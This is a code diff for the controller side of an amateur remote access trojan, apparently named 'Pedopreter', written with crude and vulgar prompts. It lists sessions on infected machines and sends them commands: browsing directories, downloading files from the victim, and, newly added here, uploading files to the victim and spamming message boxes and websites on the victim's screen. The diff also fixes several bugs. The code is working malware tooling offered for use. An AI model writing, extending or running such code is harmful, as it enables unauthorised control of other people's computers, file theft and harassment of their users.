@@ -15,6 +15,7 @@ try:
 except:
     print("you not on linux")
 
+uploading = False
 
 print("What the fuck you want")
 print("1. Listen")
@@ -82,19 +83,29 @@ def main():
             if thing2[0]:
                 if thing2[0] == "help":
                     if len(thing2) == 2:
-                        if thin2[1] == "cd":
+                        if thing2[1] == "cd":
                             print("Changes Directory to <path>")
                         elif thing2[1] == "ls":
                             print("lists files in current or specified directory")
                         elif thing2[1] == "youtube":
                             print("youtube <vid> --earrape    -- opens youtube with vid and earrape yes or no ")
-                        elif thing2[1] == "session":
+                        elif thing2[1] == "sessions":
                             print("session <session to interact with by number>  if no 2nd argument it displays all the sessions")
+                        elif thing2[1] == "upload":
+                            print("uploads file to the session. Argument 1 is <path of input file> and 2 is <path of output file> ")
+                        elif thing2[1] == "spammessage":
+                            print("Spams message <message> with title <title> <amount> times.")
+                        elif thing2[1] == "spamwebsite":
+                            print("Spams website <website> <amount> times.")
                     else:
                         print("Following commands:")
+                        print("sessions (no argument to list) <session you want to interact with>")
                         print("cd [path]")
                         print("ls [path]")
                         print("download [full path of wanted download] [output file name INCLUDING EXTRENSION like .txt]")
+                        print("upload <file> <output file>")
+                        print("spammessage <message> <title> <amount>")
+                        print("spamwebsite <website> <amout>")
                 elif thing2[0] == "ls":
                     s.send(" ".join(thing2).encode())
                     dataraw = s.recv(BUFFER_SIZE).decode()
@@ -110,6 +121,24 @@ def main():
                             print(q)
                         except:
                             print("timed out")
+                elif thing2[0] == "upload":
+                    s.send(" ".join(thing2).encode())
+                    time.sleep(1)
+                    s.settimeout(50000)
+                    uploading = True
+                    try:
+                        f = open(thing2[1], "rb")
+                        l = f.read(1024)
+                    except Exception:
+                        print("File doesnt exist")
+                    while (l):
+                        try:
+                            s.send(l)
+                            l = f.read(1024)
+                        except Exception as e:
+                            print("crap something went wrong during the upload.. the error is: " + str(e))
+                    print("done")
+                    uploading = False
                 elif thing2[0] == "sessions":
                     if len(thing2) == 1:
                         for i, x in enumerate(sessions):
@@ -126,6 +155,7 @@ def main():
                         f = open("/Pedopreter/Downloaded/"+thing2[2], "wb")
                         l = s.recv(1024)
                         f.write(l)
+                        uploading = True
                         while (l):
                             print("receiving...")
                             try:
@@ -133,12 +163,18 @@ def main():
                                 f.write(l)
                             except:
                                 print("Something went wrong during the download. Maybe it doesnt exist anymore or the connection was closed. fuck you man you cant even download a file properly")
-                    
+                        uploading = False
                         print("Done")
                 elif thing2[0] == "youtube":
                     s.send(" ".join(thing2).encode())
                 elif thing2[0] == None:
                     print("Thats nothing.. fuck.")
+                elif thing2[0] == "spammessage":
+                    if len(thing2) > 2:
+                        s.send(" ".join(thing2).encode())
+                elif thing2[0] == "spamwebsite":
+                    if len(thing2) > 1:
+                        s.send(" ".join(thing2).encode())
         except Exception as e:
             print("whoops something went wrong.. reconnecting..")
             print("this was the error:")
@@ -151,14 +187,14 @@ def keepalive():
             try:
                 alive = False
                 x.send("keepalive".encode())
-                while alive == False:
+                while alive == False and uploading == False:
                     try:
                         x.settimeout(15)
                         it = x.recv(1024)
                         if it.decode() == "still alive":
                             alive = True
                     except Exception:
-                        print("Session number: " + str(i) + ". On address: " + addresses.pop(i) + "Has lost connection or something wtf")
+                        print("Session number: " + str(i) + ". On address: " + str(addresses.pop(i)) + "Has lost connection or something wtf")
                         del sessions[i]
             
             except Exception:
